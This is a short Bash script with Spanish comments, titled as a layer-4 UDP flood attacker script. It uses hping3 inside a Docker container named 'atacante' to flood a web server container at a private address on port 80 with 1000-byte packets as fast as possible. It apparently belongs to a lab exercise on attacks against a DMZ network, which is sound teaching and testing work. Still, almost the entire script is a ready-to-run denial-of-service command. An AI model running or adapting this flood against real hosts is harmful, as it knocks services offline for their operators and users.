#!/bin/bash

# ==============================================================================
# Script Atacante - Capa 4 (UDP Flood)
# ==============================================================================

# La IP interna del servidor web dentro de Docker (Red Pública / DMZ)
TARGET_IP="172.20.10.10"

echo "======================================================"
echo " INICIANDO ATAQUE UDP FLOOD "
echo " Origen: Contenedor 'atacante' (172.20.30.10)"
echo " Objetivo: $TARGET_IP:80"
echo " Tamaño de carga útil: 1000 bytes por paquete"
echo " Presiona [Ctrl+C] para detener la ejecución."
echo "======================================================"

# Ejecutamos hping3 DESDE ADENTRO del contenedor atacante
# --udp: Protocolo UDP
# -d 1000: Paquetes pesados para ahogar el ancho de banda
# -p 80: Puerto objetivo
# --flood: Enviar tan rápido como sea posible
sudo docker exec -it atacante hping3 --udp -d 1000 -p 80 --flood $TARGET_IP